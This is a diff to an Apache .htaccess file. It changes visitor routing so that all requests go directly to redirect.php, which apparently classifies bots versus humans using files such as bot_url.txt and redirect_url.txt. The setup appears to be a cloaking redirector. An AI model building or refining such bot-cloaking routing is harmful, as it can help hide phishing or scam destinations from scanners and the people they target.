@@ -161,13 +161,12 @@ ErrorDocument 404 /index.html
     RewriteCond %{HTTP_REFERER} !^https?://(www\.)?%{HTTP_HOST} [NC]
     RewriteRule \.(gif|jpg|jpeg|png|js|css)$ - [F,L]
     
-    # VISITOR ROUTING - Enhanced behavioral detection flow
+    # VISITOR ROUTING - Direct redirect with background behavioral analysis
     # Allow direct access to admin and system files
-    RewriteCond %{REQUEST_FILENAME} -f [OR]
-    RewriteCond %{REQUEST_FILENAME} -d [OR]
-    RewriteCond %{REQUEST_URI} ^/(index\.html|redirect\.php|visitor\.html|bot-detector\.js|get_visitors\.php|check_auth\.php|admin_login\.php|admin_action\.php|get_config\.php|update_config\.php|test_api\.php|visitors\.json|redirect_url\.txt|bot_url\.txt|api_key\.txt)$
-    RewriteRule ^ - [L]
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteCond %{REQUEST_URI} !^/(index\.html|redirect\.php|bot-detector\.js|get_visitors\.php|check_auth\.php|admin_login\.php|admin_action\.php|get_config\.php|update_config\.php|test_api\.php|visitors\.json|redirect_url\.txt|bot_url\.txt|api_key\.txt)$
     
-    # Route all other traffic through behavioral detection first
-    RewriteRule ^(.*)$ visitor.html [QSA,L]
+    # Route all traffic directly to redirect.php for instant classification
+    RewriteRule ^(.*)$ redirect.php [QSA,L]
 </IfModule>
